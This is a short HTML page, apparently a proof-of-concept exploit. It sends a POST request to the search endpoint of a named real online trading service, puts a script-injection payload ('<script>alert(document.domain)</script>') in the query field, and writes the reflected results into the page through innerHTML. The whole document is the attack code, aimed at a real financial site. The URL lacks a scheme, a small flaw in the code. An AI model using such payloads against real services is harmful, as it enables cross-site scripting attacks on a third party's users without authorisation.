<html>
  <body>
    <script>
      fetch("www.nabtrade.com.au/search/search-results", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "Profile": "nabtrade",
          "Query": "<script>alert(document.domain)</script>",
          "advancedQuery": "",
          "page": 1,
          "pageSize": 10
        })
      })
      .then(res => res.json())
      .then(data => {
        // Injecting reflected content into page
        document.body.innerHTML = data.results.join("<br>");
      });
    </script>
  </body>
</html>
